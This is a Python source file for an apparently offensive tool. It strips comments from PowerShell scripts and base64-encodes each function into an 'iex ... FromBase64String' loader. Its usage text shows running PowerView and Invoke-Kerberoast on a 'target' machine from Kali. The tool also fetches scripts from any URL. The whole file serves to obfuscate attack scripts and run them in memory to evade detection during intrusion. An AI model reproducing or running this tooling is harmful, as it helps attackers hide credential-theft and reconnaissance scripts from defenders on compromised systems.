#!/bin/env python

import requests
import sys
import base64

if len(sys.argv) < 2:
	print("")
	print("Base64 Encode PS1 Files by Function")
	print("")
	print("Usage:")
	print("   %s -url URL\tLoad ps1 from url" % sys.argv[0])
	print("  OR")
	print("   %s -file FILE\tLoad ps1 from file" % sys.argv[0])
	print("  OR")
	print("   %s -cmd \"CMD\"\tEncode a single command" % sys.argv[0])
	print("")
	print("Full Example:")
	print("  (kali)   %s -file powerview.ps1 > test.ps1" % sys.argv[0])
	print("  (kali)   %s -file Invoke-Kerberoast.ps1 >> test.ps1" % sys.argv[0])
	print("  (target) Import-Module ./test.ps1")
	print("  (target) Invoke-Kerberoast | fl")
	print("")
	exit()

if sys.argv[1] == '-url':
	# print("[*] Downloading: %s" % sys.argv[1])
	r = requests.get(sys.argv[2])
	if r.status_code != 200:
		print("[!] Download failed")
		exit()
	ps1 = r.text
elif sys.argv[1] == '-file':
	# print("[*] Loading file: %s" % sys.argv[1])
	ps1 = open(sys.argv[2]).read()
elif sys.argv[1] == '-cmd':
	ps1 = sys.argv[2]
else:
	print("[!] Unknown parameter")
	exit()

inFunction = False
inComment = False
output = ''
rawCommands = ''

for line in ps1.splitlines():

	stripped = line.strip()

	if stripped == '':
		# blank line
		continue
	if stripped[0:2] == '<#':
		# start of comment section
		inComment = True
		continue
	if stripped[0:2] == '#>':
		# end of comment section
		inComment = False
		continue
	if stripped[0] == '#':
		# comment line
		continue

	# Start of function
	if not inFunction and stripped[0:8] == 'function':

		# collected any raw commands?
		if rawCommands != '':
			# print Powershell compatible base64 string
			encodedOutput = base64.b64encode(rawCommands);
			print("iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"%s\")))" % encodedOutput)
			print("")
			rawCommands = ''

		inFunction = True
		output = ''

	# Inside function
	if inFunction and not inComment:
		output += "%s\n" % line

		# End of function
		if line == '}':
			# print Powershell compatible base64 string
			encodedOutput = base64.b64encode(output);
			print("iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"%s\")))" % encodedOutput)
			print("")
			inFunction = False
			continue

	# Raw command
	if not inFunction and not inComment:
		rawCommands += "%s\n" % line
		continue

# Any remaining raw commands?
if rawCommands != '':
	# print Powershell compatible base64 string
	encodedOutput = base64.b64encode(rawCommands);
	print("iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"%s\")))" % encodedOutput)
	print("")
